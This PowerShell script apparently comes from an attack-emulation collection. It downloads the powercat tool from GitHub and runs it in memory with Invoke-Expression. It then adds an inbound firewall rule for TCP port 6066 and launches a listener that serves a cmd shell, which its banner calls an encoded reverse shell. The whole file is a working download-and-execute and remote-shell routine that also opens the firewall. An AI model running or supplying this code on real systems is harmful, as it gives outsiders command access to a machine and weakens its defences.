# Downloads and Run PowerCat
# NetCat in PowerShell
# Technic ID : xxx
Clear-Host
Write-Output "==============================================================================="
Write-Output "Downloads and use powercat.ps1 to open en encoded reverse shell  (Txxx)"
Write-Output "==============================================================================="
################ [ List of commpiled programs to downlad ] ################
$Ps1ScriptToUse = @("powercat.ps1")
$ExecuteFrom = "https://raw.githubusercontent.com/besimorhino/powercat/master"
$ListeningTcpPort= "6066"
$PwCatParameters = " -l -p "+$ListeningTcpPort+" -e cmd -ge"
$CommandToRun = "powercat $PwCatParameters `n"
################ [ GLOBAL VARIABLES ] ################
$TimeStamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss.fff K"
$LogFile = "$env:PUBLIC\exf\Tool_PowerCat.txt";
################ [ MAIN BODY ] ################
Write-Output "`n" | Out-File -FilePath "$LogFile" -Encoding utf8 -Force
Write-output "-------------------------------------"  | Out-File -FilePath $LogFile -Encoding utf8 -Append
Write-output "Script : $PSCommandPath has been launched on $TimeStamp" | Out-File -FilePath $LogFile -Encoding utf8 -Append
Write-output "-------------------------------------"  | Out-File -FilePath $LogFile -Encoding utf8 -Append
Write-Output "`n" | Out-File -FilePath "$LogFile" -Encoding utf8 -Append
foreach ($Tool in $Ps1ScriptToUse) 
{
    $DownloadRun = $ExecuteFrom+"/"+$Ps1ScriptToUse
#    $RemoteCode = (Invoke-WebRequest -Uri $DownloadRun -UseBasicParsing).Content
    Invoke-Expression (New-Object System.Net.WebClient).DownloadString($DownloadRun)
    New-NetFirewallRule -DisplayName "Allow Inbound access to port $ListeningTcpPort" -Direction Inbound -Action Allow -Protocol TCP -LocalPort $ListeningTcpPort
    #Invoke-Expression -Command $RemoteCode $PwCatParameters
    & $CommandToRun
  }